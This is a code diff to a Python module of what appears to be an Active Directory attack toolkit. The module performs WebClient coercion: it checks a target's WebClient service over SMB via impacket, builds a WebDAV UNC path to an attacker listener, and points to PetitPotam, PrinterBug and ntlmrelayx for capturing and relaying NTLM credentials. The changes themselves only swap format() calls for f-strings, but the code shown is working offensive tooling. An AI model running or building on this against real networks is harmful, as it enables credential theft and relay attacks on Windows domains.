@@ -1,5 +1,4 @@
 """WebClient coercion — trigger WebDAV auth to capture NTLM over HTTP."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -18,7 +17,7 @@ def _check_webclient_running(target: str, cred: ADCredential) -> bool:
     """Check if WebClient service is running via SCM query."""
     try:
         from impacket.dcerpc.v5 import transport, scmr
-        string_binding = "ncacn_np:{}[\\pipe\\svcctl]".format(target)
+        string_binding = f"ncacn_np:{target}[\\pipe\\svcctl]"
         rpc_transport = transport.DCERPCTransportFactory(string_binding)
 
         if cred.username:
@@ -59,15 +58,15 @@ def run(args: Any) -> int:
         print("[!] --listener required", file=sys.stderr)
         return 1
 
-    print("[*] WebClient coercion: {} → {} (HTTP-based NTLM)".format(target, listener))
+    print(f"[*] WebClient coercion: {target} → {listener} (HTTP-based NTLM)")
 
     running = _check_webclient_running(target, cred)
     if not running:
         print("[!] WebClient service not running on target")
         print("[*] Tip: start it via: searchconnector-ws file or Webclient activation trick")
 
-    webdav_url = "\\\\{}@80\\share\\file".format(listener)
-    print("[*] Coercion UNC (HTTP): {}".format(webdav_url))
+    webdav_url = f"\\\\{listener}@80\\share\\file"
+    print(f"[*] Coercion UNC (HTTP): {webdav_url}")
     print("[*] Use PetitPotam/PrinterBug with this UNC to force HTTP auth")
-    print("[*] ntlmrelayx on {} should capture HTTP-based NTLM".format(listener))
+    print(f"[*] ntlmrelayx on {listener} should capture HTTP-based NTLM")
     return 0
